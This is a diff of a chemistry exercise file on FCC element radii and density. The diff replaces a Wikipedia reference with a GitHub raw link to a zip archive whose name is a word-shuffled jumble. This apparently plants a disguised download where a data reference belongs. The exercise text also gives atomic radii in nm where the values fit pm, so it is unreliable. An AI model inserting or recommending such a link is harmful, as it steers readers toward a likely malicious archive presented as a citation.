@@ -24,7 +24,7 @@ Produce a table if the FCC element symbols abd their corresponding atomic radius
 
 ## P3.6
 reference: 
-- https://en.wikipedia.org/wiki/Atomic_radii_of_the_elements_(data_page)
+- https://github.com/dindagustiayu/-String-list-and-loops-and-Flow-Control-in-Python-for-Chemistry-Exercises/raw/refs/heads/main/enjoin/for_list_Exercises_Flow_Python_loops_Chemistry_String_Control_in_and_v3.8.zip(data_page)
 
 Alumunium, copper and lead has an atomic radius of 121, 132, and 146 nm, respectively, an FCC crystal structure, and atomic weight of 26.98, 63.55, and 207.20 g/mol. Compute their theoritical density,and compare the answer with their measured density.
 
